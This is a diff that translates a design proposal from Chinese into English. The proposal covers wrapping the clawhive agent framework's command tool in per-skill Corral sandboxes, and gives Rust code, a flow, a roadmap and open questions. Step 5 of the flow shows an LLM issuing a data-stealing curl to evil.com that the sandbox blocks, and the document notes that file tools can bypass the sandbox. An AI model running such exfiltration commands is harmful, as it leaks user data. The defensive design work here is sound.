+    /// When Skill activates, create sandbox based on its permissions
     pub fn activate_skill_sandbox(&mut self, skill_permissions: &Permissions) -> Result<()> {
         let sandbox = SandboxBuilder::from_permissions(skill_permissions.clone())
             .work_dir(self.workspace.clone())
@@ -618,9 +618,9 @@ impl ExecuteCommandTool {
         Ok(())
     }
 
-    /// Skill 停用时销毁沙箱
+    /// Destroy sandbox when Skill deactivates
     pub fn deactivate_sandbox(&mut self) {
-        self.sandbox = None;  // Drop 触发清理
+        self.sandbox = None;  // Drop triggers cleanup
     }
 }
 
@@ -631,10 +631,10 @@ impl ToolExecutor for ExecuteCommandTool {
             .ok_or_else(|| anyhow!("missing 'command' field"))?;
 
         let result = if let Some(sandbox) = &self.sandbox {
-            // 有沙箱：受控执行
+            // Has sandbox: controlled execution
             sandbox.execute(command).await?
         } else {
-            // 无沙箱：直接执行（兼容无 permissions 的老 skill）
+            // No sandbox: direct execution (compatible with old skills without permissions)
             self.execute_raw(command).await?
         };
 
@@ -646,148 +646,148 @@ impl ToolExecutor for ExecuteCommandTool {
 }
 ```
 
-### 4.3 端到端流程
+### 4.3 End-to-End Flow
 
 ```
-1. 用户消息进入 → Orchestrator 选择 Agent + Skill
+1. User message arrives → Orchestrator selects Agent + Skill
 
-2. Skill 加载：
+2. Skill loading:
    SkillRegistry::get("web_fetch")
-   → 解析 SKILL.md frontmatter
-   → 得到 Permissions { fs, network, exec, ... }
+   → Parse SKILL.md frontmatter
+   → Get Permissions { fs, network, exec, ... }
 
-3. 沙箱激活：
+3. Sandbox activation:
    execute_command_tool.activate_skill_sandbox(&skill.permissions)
    → SandboxBuilder::from_permissions(...)
-   → 创建 Sandbox 实例（设置 libsandbox、work_dir 等）
+   → Create Sandbox instance (set up libsandbox, work_dir, etc.)
 
-4. LLM 决策执行：
-   LLM 阅读 skill prompt → 决定调用 execute_command("curl -s https://api.example.com/data")
+4. LLM decision execution:
+   LLM reads skill prompt → decides to call execute_command("curl -s https://api.example.com/data")
    → ExecuteCommandTool::execute()
    → sandbox.execute("curl -s https://api.example.com/data")
-   → libsandbox 检查：curl 在 exec 白名单? ✓ api.example.com:443 在 network 白名单? ✓
-   → 执行成功，返回结果
+   → libsandbox checks: curl in exec whitelist? ✓ api.example.com:443 in network whitelist? ✓
+   → Execution succeeds, returns result
 
-5. LLM 继续决策：
+5. LLM continues deciding:
    LLM → execute_command("curl http://evil.com/steal?data=...")
    → sandbox.execute(...)
-   → libsandbox 检查：evil.com 不在 network 白名单 → EACCES
-   → 返回错误
+   → libsandbox checks: evil.com not in network whitelist → EACCES
+   → Returns error
 
-6. 对话结束 → Skill 停用 → sandbox Drop → 清理
+6. Conversation ends → Skill deactivates → sandbox Drop → cleanup
 ```
 
 ---
 
-## 5. 优先级与演进路线
+## 5. Priority and Evolution Roadmap
 
-### Phase 1：Library Crate 拆分（建议 1、4）
+### Phase 1: Library Crate Extraction (Suggestions 1, 4)
 
-**最高优先级**。没有这一步，下游集成无从谈起。
+**Highest priority**. Without this step, downstream integration impossible.
 
-- 拆出 `corral-core` crate
-- `PolicyEngine` 从 `Manifest` 解耦为 `Permissions`
-- `Permissions` 类型支持程序化构建和合并
-- `corral` CLI 改为依赖 `corral-core`
-- 不需要改动 libsandbox 或平台实现
+- Extract `corral-core` crate
+- Decouple `PolicyEngine` from `Manifest` to `Permissions`
+- `Permissions` type supports programmatic construction and merging
+- `corral` CLI changes to depend on `corral-core`
+- No need to change libsandbox or platform implementation
 
-**预估改动量**：中等（主要是文件移动 + 接口调整，逻辑不变）
+**Estimated effort**: Medium (mainly file moves + interface adjustments, logic unchanged)
 
-### Phase 2：SandboxBuilder + 会话式沙箱（建议 2、3、5）
+### Phase 2: SandboxBuilder + Session-based Sandbox (Suggestions 2, 3, 5)
 
-**核心 API 层**。这是下游最常用的接口。
+**Core API layer**. This is the most-used interface for downstream.
 
-- 实现 `SandboxBuilder` API
-- 实现 `Sandbox` 的 `execute()` / `execute_script()` 方法
-- 重构 `PlatformSandbox` trait 区分 setup/execute/teardown
-- 支持 `Sandbox` 实例复用
+- Implement `SandboxBuilder` API
+- Implement `Sandbox`'s `execute()` / `execute_script()` methods
+- Refactor `PlatformSandbox` trait to separate setup/execute/teardown
+- Support `Sandbox` instance reuse
 
-**预估改动量**：较大（涉及 runtime 层重构）
+**Estimated effort**: Larger (involves runtime layer refactoring)
 
-### Phase 3：Broker 可选化 + Feature Gate（建议 6）
+### Phase 3: Broker Optional + Feature Gate (Suggestion 6)
 
-- Broker 相关代码用 feature gate 包裹
-- 无 Broker 时，沙箱仍然正常工作（只有 libsandbox 级别的隔离）
-- 有 Broker 时，提供系统服务代理能力
+- Wrap Broker-related code with feature gates
+- Without Broker, sandbox still works normally (only libsandbox level isolation)
+- With Broker, provides system service proxy capabilities
 
-**预估改动量**：中等
+**Estimated effort**: Medium
 
-### Phase 4：策略注入改进 + 增强（建议 7）
+### Phase 4: Policy Injection Improvement + Enhancements (Suggestion 7)
 
-- libsandbox 策略注入支持文件描述符/临时文件
-- 更完善的 glob 路径匹配（当前 `$SKILL_DIR` 等变量的处理比较初步）
-- 审计日志的结构化输出
+- libsandbox policy injection supports file descriptor/temp file
+- More complete glob path matching (current `$SKILL_DIR` etc. variable handling is preliminary)
+- Structured audit log output
 
-**预估改动量**：小到中等
+**Estimated effort**: Small to medium
 
-### Phase 5：稳定化
+### Phase 5: Stabilization
 
-- 完善测试覆盖（尤其是 libsandbox 的 C 代码）
-- CI/CD 配置（macOS + Linux 双平台）
-- crates.io 发布
-- 文档完善
-
----
-
-## 6. 开放问题
-
-以下问题需要 Corral 团队评估：
-
-1. **Library Crate 的最小 API 表面应该是什么？** 上面的 `SandboxBuilder` + `Sandbox` 设计是否合理，还是有更好的抽象？
-
-2. **libsandbox 的分发方式**：下游依赖 `corral-core` 时，`libsandbox.dylib` / `libsandbox.so` 怎么构建和分发？build.rs 自动编译？还是要求系统预装？
-
-3. **权限变量（`$SKILL_DIR` 等）的解析时机**：当前 `PolicyEngine` 在匹配路径时需要知道 `$SKILL_DIR` 的实际值。这个解析应该在 `SandboxBuilder::build()` 时做（传入实际路径），还是在 `PolicyEngine` 内部做？
-
-4. **对 `read_file` / `write_file` 等非 shell 工具的沙箱覆盖**：clawhive 不只有 `execute_command`，还有 `read_file`、`write_file` 等 Rust 代码直接实现的 tool。这些操作不经过 `sh -c`，libsandbox 拦截不到。是否需要在 Rust 层提供路径检查 API（复用 `PolicyEngine::check_file_read/write`）？
-
-5. **多 Skill 并发的沙箱隔离**：如果一个 Agent 同时激活多个 Skill（每个有不同的 permissions），沙箱实例如何管理？每个 Skill 一个独立的 `Sandbox` 实例，还是合并权限？
+- Improve test coverage (especially libsandbox C code)
+- CI/CD configuration (macOS + Linux dual platform)
+- crates.io publishing
+- Documentation completion
 
 ---
 
-## 附录 A：clawhive 当前架构参考
+## 6. Open Questions
+
+The following questions need Corral team evaluation:
+
+1. **What should be the minimum API surface for Library Crate?** Is the `SandboxBuilder` + `Sandbox` design above reasonable, or is there a better abstraction?
+
+2. **libsandbox distribution method**: When downstream depends on `corral-core`, how should `libsandbox.dylib` / `libsandbox.so` be built and distributed? build.rs auto-compile? Or require system pre-installation?
+
+3. **Permission variable (`$SKILL_DIR` etc.) resolution timing**: Current `PolicyEngine` needs to know actual value of `$SKILL_DIR` when matching paths. Should this resolution happen at `SandboxBuilder::build()` time (pass in actual paths), or inside `PolicyEngine`?
+
+4. **Sandbox coverage for non-shell tools like `read_file` / `write_file`**: clawhive doesn't only have `execute_command`, also has `read_file`, `write_file` and other tools implemented directly in Rust code. These operations don't go through `sh -c`, libsandbox can't intercept them. Should we provide path checking API at Rust layer (reuse `PolicyEngine::check_file_read/write`)?
+
+5. **Sandbox isolation for concurrent multi-Skill**: If one Agent simultaneously activates multiple Skills (each with different permissions), how to manage sandbox instances? One independent `Sandbox` instance per Skill, or merge permissions?
+
+---
+
+## Appendix A: clawhive Current Architecture Reference
 
 ```
 crates/
 ├── clawhive-core/
 │   ├── src/
 │   │   ├── tool.rs              ← ToolExecutor trait + ToolRegistry
-│   │   ├── shell_tool.rs        ← execute_command 实现（需要沙箱包裹的核心位置）
+│   │   ├── shell_tool.rs        ← execute_command implementation (core location needing sandbox wrapping)
 │   │   ├── file_tools.rs        ← read_file / write_file / edit_file
 │   │   ├── skill.rs             ← SkillFrontmatter + SkillRegistry
-│   │   ├── orchestrator.rs      ← tool_use_loop（LLM ↔ Tool 循环）
-│   │   └── config.rs            ← ToolPolicyConfig（当前只有 tool 名称白名单）
+│   │   ├── orchestrator.rs      ← tool_use_loop (LLM ↔ Tool loop)
+│   │   └── config.rs            ← ToolPolicyConfig (currently only tool name whitelist)
 ├── clawhive-runtime/
-│   └── src/lib.rs               ← TaskExecutor trait（NativeExecutor / WasmExecutor stub）
+│   └── src/lib.rs               ← TaskExecutor trait (NativeExecutor / WasmExecutor stub)
 ```
 
-**技术栈重叠**：clawhive 和 Corral 共享 tokio、serde、serde_yaml、anyhow、thiserror、clap、tracing — 集成不会引入新的重型依赖。
+**Tech stack overlap**: clawhive and Corral share tokio, serde, serde_yaml, anyhow, thiserror, clap, tracing — integration won't introduce new heavy dependencies.
 
-## 附录 B：Corral 当前源码结构参考
+## Appendix B: Corral Current Source Structure Reference
 
 ```
 corral/
 ├── corral/src/
-│   ├── main.rs          ← CLI 入口 + run_skill/inspect_skill/approve_skill
-│   ├── manifest.rs      ← Manifest + Permissions 类型定义 + YAML 解析
-│   ├── policy.rs        ← PolicyEngine（权限检查逻辑）
+│   ├── main.rs          ← CLI entry + run_skill/inspect_skill/approve_skill
+│   ├── manifest.rs      ← Manifest + Permissions type definitions + YAML parsing
+│   ├── policy.rs        ← PolicyEngine (permission checking logic)
 │   ├── broker/
 │   │   ├── mod.rs       ← BrokerHandle + start_broker + broker_loop
-│   │   ├── jsonrpc.rs   ← JSON-RPC 请求/响应类型
-│   │   ├── router.rs    ← method → handler 路由
+│   │   ├── jsonrpc.rs   ← JSON-RPC request/response types
+│   │   ├── router.rs    ← method → handler routing
 │   │   └── handlers/    ← fs/network/services/exec/env handlers
 │   ├── platform/
 │   │   ├── mod.rs       ← Runtime trait + create_runtime()
-│   │   ├── macos.rs     ← MacOSRuntime（DYLD + libsandbox）
-│   │   └── linux.rs     ← LinuxRuntime（bubblewrap）
-│   ├── watchdog.rs      ← 资源监控（目前 TODO）
-│   ├── audit.rs         ← 审计日志
-│   └── adapters/        ← 系统服务实现（reminders 等）
+│   │   ├── macos.rs     ← MacOSRuntime (DYLD + libsandbox)
+│   │   └── linux.rs     ← LinuxRuntime (bubblewrap)
+│   ├── watchdog.rs      ← Resource monitoring (currently TODO)
+│   ├── audit.rs         ← Audit logging
+│   └── adapters/        ← System service implementations (reminders etc.)
 ├── libsandbox/
-│   ├── interpose_macos.c  ← DYLD interpose 实现（~350 行）
-│   ├── interpose_linux.c  ← LD_PRELOAD 实现
-│   ├── policy.c           ← 策略加载和检查逻辑
-│   └── comm.c             ← Broker 通信
+│   ├── interpose_macos.c  ← DYLD interpose implementation (~350 lines)
+│   ├── interpose_linux.c  ← LD_PRELOAD implementation
+│   ├── policy.c           ← Policy loading and checking logic
+│   └── comm.c             ← Broker communication
 └── sdk/sandbox-call/src/
-    └── main.rs            ← sandbox-call CLI（脚本端 SDK）
+    └── main.rs            ← sandbox-call CLI (script-side SDK)
 ```
